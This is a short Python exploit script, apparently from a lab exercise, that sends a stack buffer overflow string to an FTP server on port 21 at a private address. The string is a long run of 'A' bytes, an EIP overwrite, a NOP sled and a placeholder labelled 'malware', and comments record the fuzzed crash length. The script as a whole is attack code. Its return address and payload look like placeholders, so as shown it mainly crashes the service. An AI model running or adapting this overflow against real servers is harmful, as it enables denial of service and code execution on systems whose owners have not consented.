import socket

host = "192.168.1.10"
port = 21

EIP = "\x45\x44\x43\x42"
malware = "7058E2E0"  
nop = "\x90"*20
length = 2007  
#Server crashed at length 2011 with
#for length in range(1, 3000, 30):
try:
    client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_sock.settimeout(3)
    # set timeout for all subsequent blocking methods
    # If the operation is not complete within 3 seconds, an exception will be raised
    client_sock.connect((host, port))  
    msg = client_sock.recv(1024)  #blocking
    print(msg.decode())
    bad_str = "A"*length + EIP+ nop + malware + "\r\n" 
    client_sock.send(bad_str.encode())
    msg = client_sock.recv(1024)   #blocks if server crashes
    print(msg.decode())
    client_sock.close()
except:
    print("Server crashed at length", length)
    #break

	



